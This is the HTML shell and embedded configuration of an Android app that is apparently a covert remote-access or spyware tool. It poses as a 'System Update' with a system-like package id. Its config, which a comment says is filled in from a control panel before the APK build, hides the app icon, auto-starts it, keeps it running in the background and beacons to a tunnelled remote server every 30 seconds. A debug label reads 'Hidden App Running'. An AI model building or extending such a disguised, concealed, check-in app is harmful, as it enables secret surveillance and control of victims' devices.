<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    
    <!-- ⚙️ CONFIG INJECTION POINT -->
    <!-- يتم حقن الإعدادات هنا من لوحة التحكم قبل بناء APK -->
    <script id="app-config" type="application/json">
    {
        "configId": "default",
        "generatedAt": "2025-01-01T00:00:00.000Z",
        "app": {
            "name": "System Update",
            "id": "com.system.service",
            "version": "2.0.0"
        },
        "server": {
            "url": "https://yellow-garlics-fall.loca.lt",
            "checkInInterval": 30000,
            "timeout": 10000,
            "retries": 5
        },
        "behavior": {
            "hideIcon": true,
            "autoStart": true,
            "runInBackground": true,
            "preventSleep": true
        },
        "security": {
            "encryptData": true,
            "verifySSL": true
        },
        "custom": {}
    }
    </script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { 
            width: 100%; 
            height: 100%; 
            background: #000; 
            overflow: hidden;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        #app { display: none; visibility: hidden; opacity: 0; }
        /* Debug overlay - يُزال في الإنتاج */
        #debug-overlay {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            color: #0f0;
            padding: 5px 10px;
            font-size: 10px;
            font-family: monospace;
            border-radius: 4px;
            display: none;
        }
    </style>
</head>
<body>
    <div id="app"></div>
    <div id="debug-overlay">Hidden App Running</div>
    
    <!-- تحميل التطبيق -->
    <script src="app.js"></script>
</body>
</html>
